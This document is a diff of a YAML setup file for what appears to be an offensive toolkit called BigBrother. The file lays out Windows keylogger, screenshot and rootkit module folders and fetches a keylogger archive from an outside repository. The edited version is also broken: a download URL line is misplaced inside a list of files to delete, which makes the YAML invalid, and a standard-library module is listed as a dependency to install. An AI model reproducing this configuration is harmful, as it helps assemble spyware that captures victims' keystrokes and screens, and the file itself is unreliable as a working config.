@@ -1,13 +1,15 @@
 ---
-# Python modules to import
-python_modules_needed:
-  - requests
-
-# Module Directories
+download_repositories:
+  - name: windows_api
+    path: windows/anagenesis/katascopos/keylogger
+file_to_delete:
+  - README.md
+  - LICENSE
+  - CHANGELOG.md
+    url: https://gitlab.com/PhantomGhosts/Windows_api-Keylogger/repository/archive.tar.gz?ref=master
+main_directory: /usr/share/BigBrother
 module_directories:
   - modules
-
-# Module Subirectories
 module_directories_subfolders:
   - windows
   - windows/anagenesis
@@ -19,16 +21,7 @@ module_directories_subfolders:
   - windows/anagenesis/katascopos/keylogger
   - windows/anagenesis/katascopos/screenshoter
   - windows/anagenesis/ypnokratos/rootkit
-
-# Download repositories
-download_repositories:
-  - name: windows_api
-    path: windows/anagenesis/katascopos/keylogger
-    url: https://gitlab.com/PhantomGhosts/Windows_api-Keylogger/repository/archive.tar.gz?ref=master
-
-# File to delete
-file_to_delete:
-  - README.md
-  - LICENSE
-  - CHANGELOG.md
+python_modules_needed:
+  - requests
+  - shlex
 ...
